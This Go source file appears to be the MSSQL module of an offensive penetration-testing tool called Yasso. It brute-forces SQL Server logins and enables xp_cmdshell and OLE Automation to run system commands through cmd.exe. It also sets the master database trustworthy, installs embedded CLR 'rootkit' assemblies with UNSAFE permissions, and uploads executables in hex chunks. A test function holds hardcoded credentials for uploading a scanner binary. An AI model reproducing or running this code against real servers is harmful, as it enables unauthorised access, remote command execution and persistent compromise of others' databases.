package cmd

import (
	"Yasso/config"
	"database/sql"
	_ "embed"
	"encoding/hex"
	"fmt"
	"github.com/cheggaaa/pb/v3"
	_ "github.com/denisenkom/go-mssqldb"
	"github.com/olekukonko/tablewriter"
	"github.com/spf13/cobra"
	"io/ioutil"
	"math"
	"os"
	"strconv"
	"strings"
	"time"
)

/*
	内网mssql数据库比较多，可以完善一下clr和xp_cmdshell,spoacreate
*/

var (
	HelpWarSQLKit    int
	InWarSQLKit      int
	UnWarSQLKit      int
	ExecuteMethod    int
	UploadFile       []string
	WarSQLKitCommand string
	WarSQLCommand    string
)

var MssqlCmd = &cobra.Command{
	Use:   "mssql",
	Short: "SQL Server burst module and extend tools (not support proxy)",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" && ConnHost == "" {
			_ = cmd.Help()
		} else {
			MssqlBurpByUser()
		}
	},
}

var (
	conn = new(setting)
)

func init() {
	MssqlCmd.Flags().IntVar(&HelpWarSQLKit, "kithelp", 0, "print SQLKit Use help")
	MssqlCmd.Flags().IntVar(&InWarSQLKit, "inkit", 0, "install mssql SQLKit Rootkit [1,WarSQLKit] [2,SharpSQLKit(no echo)]")
	MssqlCmd.Flags().IntVar(&UnWarSQLKit, "unkit", 0, "uninstall mssql SQLKit Rootkit [1,WarSQLKit] [2,SharpSQLKit(no echo)]")
	MssqlCmd.Flags().StringVar(&WarSQLKitCommand, "cld", "", "Execute WarSQLKit  Command (eg.) --cld \"whoami\"")
	MssqlCmd.Flags().StringVarP(&WarSQLCommand, "sql", "s", "", "Execute sql command")
	MssqlCmd.Flags().StringVarP(&SQLCommand, "cmd", "c", "", "Execute System command")
	MssqlCmd.Flags().StringVar(&ConnHost, "hostname", "", "Remote Connect mssql address(brute param need false)")
	MssqlCmd.Flags().StringVar(&LoginUser, "user", "sa", "Login ssh username")
	MssqlCmd.Flags().StringVar(&LoginPass, "pass", "", "Login ssh password")
	MssqlCmd.Flags().IntVar(&ExecuteMethod, "method", 1, "Execute System command method [1,xpshell] [2,oleshell]")
	MssqlCmd.Flags().StringArrayVar(&UploadFile, "upload", nil, "Use ole upload file (.eg) source,dest")
}

func MssqlBurpByUser() {
	if BrutePort == 0 {
		BrutePort = 1433
	}
	var ips []string
	var err error
	if Hosts != "" && ConnHost == "" {
		ips, err = ResolveIPS(Hosts)
		if err != nil {
			Println(fmt.Sprintf("resolve hosts address failed %v", err))
			return
		}
		if BruteFlag == true {
			users, pass := ReadTextToDic("mssql", UserDic, PassDic)
			Println(Clearln + "[*] Brute Module [mssql]")
			Println(fmt.Sprintf(Clearln+"[*] Have [user:%v] [pass:%v] [request:%v]", len(users), len(pass), len(users)*len(pass)*len(ips)))
			SwitchBurp("mssql", users, pass, ips, BrutePort, Runtime, TimeDuration, "")
		} else {
			Println(Clearln + "[*] May be you want to brute? try to add --crack")
		}
	}
	if Hosts == "" && ConnHost != "" && LoginUser != "" && LoginPass != "" {

		db, status, err := MssqlConn(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, LoginUser, LoginPass)
		if err != nil {
			Println(fmt.Sprintf("[!] Login mssql failed %v", err))
			return
		}
		if db != nil && status == true {
			conn.Setting(db)
			switch {
			case UnWarSQLKit > 0 && UnWarSQLKit <= 2:
				conn.Uninstall_clr(UnWarSQLKit)
			case InWarSQLKit > 0 && InWarSQLKit <= 2:
				conn.Install_clr(InWarSQLKit)
			case SQLCommand != "":
				if ExecuteMethod == 1 {
					Println("[+] Execute Method: xp_cmdshell")
					conn.xp_shell(SQLCommand)
				} else if ExecuteMethod == 2 {
					Println("[+] Execute Method: ole echo")
					conn.sp_shell(SQLCommand)
				}
			case HelpWarSQLKit > 0 && HelpWarSQLKit <= 2:
				WarSQLKitHelp(HelpWarSQLKit)
			case len(UploadFile) == 1:
				filelist := strings.Split(UploadFile[0], ",")
				if len(filelist) == 2 {
					conn.UploadFile(filelist[0], filelist[1])
				} else {
					Println("[!] upload file only need 2 params")
				}
				break
			case WarSQLKitCommand != "":
				conn.WarSQLKitShell(WarSQLKitCommand)
			case WarSQLCommand != "":
				r, err := SQLExecute(conn.Conn, WarSQLCommand)
				if err != nil {
					return
				}
				for i, s := range r.Rows {
					Println(s[i])
				}
			default:
				conn.UnSetting()
			}
		}
	}
}

//go:embed static/WarSQLKit.dll
var WarSQLKitName []byte

//go:embed static/SharpSQLKit.txt
var SharpSQLKit string

type setting struct {
	Conn    *sql.DB
	Command string
}

func MssqlConn(info config.HostIn, user, pass string) (*sql.DB, bool, error) {
	var flag = false
	db, err := sql.Open("mssql", fmt.Sprintf("sqlserver://%v:%v@%v:%v/?connection&timeout=%v&encrypt=disable", user, pass, info.Host, info.Port, info.TimeOut))
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.TimeOut))
		db.SetConnMaxIdleTime(time.Duration(info.TimeOut))
		db.SetMaxIdleConns(0)
		err = db.Ping()
		if err == nil {
			flag = true
			return db, flag, nil
		}
	}

	return db, flag, err
}

// 设置数据库连接

func (s *setting) Setting(conn *sql.DB) {
	s.Conn = conn
}

func (s *setting) check_configuration(option string, value int) bool {
	var Command = fmt.Sprintf(`SELECT cast(value as INT) as b FROM sys.configurations where name = '%s';`, option)
	r, err := SQLExecute(s.Conn, Command)
	if err != nil {
		return false
	}
	if len(r.Rows) == 1 && r.Rows[0][0] == strconv.Itoa(value) {
		return true
	}
	return false
}

func (s *setting) set_configuration(option string, value int) bool {
	// 设置
	var Command = fmt.Sprintf("exec master.dbo.sp_configure '%v','%v';RECONFIGURE;", option, value)
	_, err := SQLExecute(s.Conn, Command)
	if err != nil {
		return false
	}
	return s.check_configuration(option, value)
}

func (s *setting) set_permission_set() bool {
	var Command = fmt.Sprintf("ALTER DATABASE master SET TRUSTWORTHY ON;")
	Println("[+] ALTER DATABASE master SET TRUSTWORTHY ON")
	_, err := SQLExecute(s.Conn, Command)
	if err != nil {
		Println("[!] ALTER DATABASE master SET TRUSTWORTHY ON Failed")
		return false
	}
	return true
}

// 启用xp_cmdshell

func (s *setting) Enable_xp_cmdshell() bool {
	if !s.set_configuration("show advanced options", 1) {
		Println("[!] cannot ebable 'show advanced options'")
		return false
	}
	if !s.set_configuration("xp_cmdshell", 1) {
		Println("[!] cannot enable 'xp_cmdshell'")
		return false
	}
	return true
}

// 关闭xp_cmdshell

func (s *setting) Disable_xp_cmdshell() bool {
	if !s.set_configuration("show advanced options", 1) {
		Println("[!] cannot enable 'show advanced options'")
		return false
	}
	if !s.set_configuration("xp_cmdshell", 0) {
		Println("[!] cannot disable 'xp_cmdshell'")
		return false
	}
	if !s.set_configuration("show advanced options", 0) {
		Println("[!] cannot disable 'show advanced options'")
		return false
	}
	return true
}

func (s *setting) Enable_ole() bool {
	if !s.set_configuration("show advanced options", 1) {
		Println("[!] cannot enable 'show advanced options'")
		return false
	}
	if !s.set_configuration("Ole Automation Procedures", 1) {
		Println("[!] cannot enable 'Ole Automation Procedures'")
		return false
	}
	return true
}

func (s *setting) Disable_ole() bool {
	if !s.set_configuration("show advanced options", 1) {
		Println("[!] cannot enable 'show advanced options'")
		return false
	}
	if !s.set_configuration("Ole Automation Procedures", 0) {
		Println("[!] cannot disable 'Ole Automation Procedures'")
		return false
	}
	if !s.set_configuration("show advanced options", 0) {
		Println("[!] cannot disable 'show advanced options'")
		return false
	}
	return true
}

func (s *setting) sp_shell(Command string) bool {
	if s.check_configuration("Ole Automation Procedures", 0) && !s.Enable_ole() {
		return false
	}
	var sqlstr = fmt.Sprintf(`declare @shell int,@exec int,@text int,@str varchar(8000)
exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c %v'
exec sp_oamethod @exec, 'StdOut', @text out;
exec sp_oamethod @text, 'ReadAll', @str out
select @str`, Command)
	Println(fmt.Sprintf("[+] Command: %v", Command))
	r, err := SQLExecute(s.Conn, sqlstr)
	if err != nil {
		Println(fmt.Sprintf("[!] exec ole command failed %v", err))
		return false
	}
	for i, b := range r.Rows {
		Println(b[i])
	}
	return true
}

func (s *setting) xp_shell(Command string) bool {

	if s.set_configuration("xp_cmdshell", 0) && !s.Enable_xp_cmdshell() {
		return false
	}
	Println(fmt.Sprintf("[+] Command: %v", Command))
	var sqlstr = fmt.Sprintf("exec master..xp_cmdshell '%v'", Command)
	r, err := SQLExecute(s.Conn, sqlstr)
	if err != nil {
		Println(fmt.Sprintf("[!] exec xp_cmdshell command failed %v", err))
		return false
	}
	for _, b := range r.Rows {
		Println(b[0])
	}
	return true
}

func WarSQLKitToHex() string {
	return hex.EncodeToString(WarSQLKitName)
}

func (s *setting) CREATE_ASSEMBLY(flag int) bool {
	var KitHex string

	if flag == 1 {
		Println("[+] SQLKit ==> WarSQLKit")
		KitHex = WarSQLKitToHex()
	} else if flag == 2 {
		Println("[+] SQLKit ==> SharpSQLKit")
		KitHex = SharpSQLKit
	}
	var Command = fmt.Sprintf(`CREATE ASSEMBLY [CLR_module]
    AUTHORIZATION [dbo]
    FROM 0x%s
    WITH PERMISSION_SET = UNSAFE;`, KitHex)
	_, err := SQLExecute(s.Conn, Command)
	if err != nil {
		Println(fmt.Sprintf("[!] Import the assembly failed %v", err))
		return false
	}
	Println("[+] Import the assembly")
	return true
}

func (s *setting) CREATE_PROCEDURE(flag int) bool {
	var Command string
	if flag == 1 {
		Command = fmt.Sprintf(`CREATE PROCEDURE [dbo].[sp_cmdExec] @cmd NVARCHAR (MAX), @result NVARCHAR (MAX) OUTPUT AS EXTERNAL NAME [CLR_module].[StoredProcedures].[CmdExec];`)
	} else if flag == 2 {
		Command = fmt.Sprintf(`CREATE PROCEDURE [dbo].[ClrExec]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [CLR_module].[StoredProcedures].[ClrExec]`)
	}
	_, err := SQLExecute(s.Conn, Command)
	if err != nil {
		Println(fmt.Sprintf("[!] Link the assembly to a stored procedure failed %v", err))
		return false
	}
	Println("[+] Link the assembly to a stored procedure")
	return true
}

func (s *setting) Install_clr(flag int) bool {
	if !s.set_permission_set() {
		return false
	}
	if !s.CREATE_ASSEMBLY(flag) {
		return false
	}
	if !s.CREATE_PROCEDURE(flag) {
		return false
	}
	Println("[+] Install SQLKit successful!")
	Println("[+] Please Use SQL Connect Tools to Execute")
	Println("[+] WarSQLKit Command Help --kithelp [1,2]")
	return true
}

func (s *setting) Uninstall_clr(flag int) bool {
	var Command string
	if flag == 1 {
		Println("[+] SQLKit ==> WarSQLKit")
		Command = fmt.Sprintf(`drop PROCEDURE dbo.sp_cmdExec
drop assembly CLR_module`)
	} else if flag == 2 {
		Println("[+] SQLKit ==> SharpSQLKit")
		Command = fmt.Sprintf(`drop PROCEDURE dbo.ClrExec
drop assembly CLR_module`)
	}
	_, err := SQLExecute(s.Conn, Command)
	if err != nil {
		Println(fmt.Sprintf("[!] Uninstall SQLKit failed %v", err))
		return false
	}
	Println("[+] Uninstall SQLKit successful!")
	return true
}

func ReadFileToSplitHex(path string, splitLength int) []string {
	data, err := ioutil.ReadFile(path)
	if err != nil {

		return []string{}
	}
	HexData := hex.EncodeToString(data)
	var hexList []string
	num := int(math.Ceil(float64(len(HexData) / splitLength)))
	for i := 0; i < num; i++ {
		hexList = append(hexList, HexData[i*splitLength:(i+1)*splitLength])
	}
	hexList = append(hexList, HexData[num*splitLength:])
	// 返回分割好的list
	return hexList
}

func (s *setting) UploadFile(source, dest string) {
	Println(fmt.Sprintf("[+] Ole Upload File %s to %s", source, dest))
	if s.set_configuration("Ole Automation Procedures", 0) && !s.Enable_ole() {
		Println("[!] setting Ole Automation or enable Ole failed")
		return
	}
	var copyCommand = `copy /b`
	var splitLength = 250000
	Hexlist := ReadFileToSplitHex(source, splitLength)
	bar := pb.StartNew(len(Hexlist))

	for i, body := range Hexlist {
		var text2 = fmt.Sprintf("%v_%v.config_txt", dest, i)
		var sqlstr = fmt.Sprintf(`DECLARE @ObjectToken INT
                        EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
                        EXEC sp_OASetProperty @ObjectToken, 'Type', 1
                        EXEC sp_OAMethod @ObjectToken, 'Open'
                        EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x%s
                        EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'%s', 2
                        EXEC sp_OAMethod @ObjectToken, 'Close'
                        EXEC sp_OADestroy @ObjectToken`, body, text2)
		_, err := SQLExecute(s.Conn, sqlstr)
		if err != nil {
			Println(fmt.Sprintf("\n[!] %s_%v.config_txt Error Uploading", dest, i))
			return
		}
		if i == 0 {
			copyCommand = copyCommand + ` "` + text2 + `"`
		} else {
			copyCommand = copyCommand + " +" + ` "` + text2 + `"`
		}
		time.Sleep(1000 * time.Millisecond)
		if s.File_Exists(text2, 1) {
			bar.Increment()
			//Println()(fmt.Sprintf("[+] %s_%v.config_txt Upload completed",dest,i))
		} else {
			Println(fmt.Sprintf("\n[!] %s_%v.config_txt Error Uploading", dest, i))
			return
		}
	}
	copyCommand = copyCommand + ` "` + dest + `"`
	var shell = fmt.Sprintf(`
	DECLARE @SHELL INT
	EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT
	EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c`)
	_, err := SQLExecute(s.Conn, shell+copyCommand+"'")
	if err != nil {
		Println(fmt.Sprintf("%v", err))
		return
	}
	Println("\n[+] copy file success")
	time.Sleep(1000 * time.Millisecond)
	if s.File_Exists(dest, 1) {
		sqlstr := shell + fmt.Sprintf(`del %s*.config_txt`, dest) + "'"
		_, err := SQLExecute(s.Conn, sqlstr)
		if err != nil {
			Println(fmt.Sprintf("[!] del file failed %v", err))
			return
		}
		Println(fmt.Sprintf("\n[+] %s Upload completed", source))
	}
}

func (s *setting) File_Exists(path string, value int) bool {
	var Command = fmt.Sprintf(`
DECLARE @r INT
EXEC master.dbo.xp_fileexist '%v', @r OUTPUT
SELECT @r as n`, path)
	r, err := SQLExecute(s.Conn, Command)
	if err != nil {
		return false
	}
	if len(r.Rows) == 1 && r.Rows[0][0] == strconv.Itoa(value) {
		return true
	}
	return false
}

func WarSQLKitHelp(flag int) {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"SQL Command", "Introduce"})
	table.SetRowLine(true)
	var help [][]string
	if flag == 1 {
		help = config.WarKitHelp
	} else if flag == 2 {
		help = config.SharpKitHelp
	}
	for _, v := range help {
		table.Append(v)
	}
	table.Render()
}

func (s *setting) UnSetting() {
	s.Conn = nil
}

func (s *setting) WarSQLKitShell(cld string) {
	var Command = fmt.Sprintf(`declare @shell varchar(8000);
EXEC sp_cmdExec '%v' ,@shell output
select @shell`, cld)
	r, err := SQLExecute(s.Conn, Command)
	if err != nil {
		Println(fmt.Sprintf("[!] %v", err))
		return
	}
	for i, s := range r.Rows {
		Println(s[i])
	}
}

func Test() {
	db, status, err := MssqlConn(config.HostIn{Host: "192.168.248.128", Port: 1433, TimeOut: 1 * time.Second}, "sa", "admin@123")
	if status == true && err == nil {
		conn := new(setting)
		conn.Setting(db)
		conn.UploadFile(`C:\Users\Administrator\Desktop\fscan64.exe`, `1.exe`)
	}
}
